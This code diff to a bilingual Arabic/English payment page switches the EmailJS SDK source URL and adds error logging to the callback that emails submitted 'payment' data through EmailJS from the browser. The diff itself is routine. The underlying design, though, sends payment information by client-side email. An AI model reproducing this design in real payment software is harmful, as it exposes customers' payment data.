@@ -120,7 +120,8 @@
   <button onclick="sendPayment()" id="submitBtn">تأكيد الدفع</button>
 </div>
 
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<!-- EmailJS SDK v3 -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
   emailjs.init("1xqwBMfecM1SSulsh");
 
@@ -180,8 +181,9 @@
     emailjs.send("service_plzxomt", "template_q95bk8a", data)
       .then(() => {
         alert(currentLang === "ar" ? "✅ تم تأكيد الدفع بنجاح." : "✅ Payment confirmed successfully.");
-      }, () => {
+      }, (error) => {
         alert(currentLang === "ar" ? "❌ حدث خطأ أثناء الإرسال." : "❌ Error during sending.");
+        console.error(error);
       });
   }
 
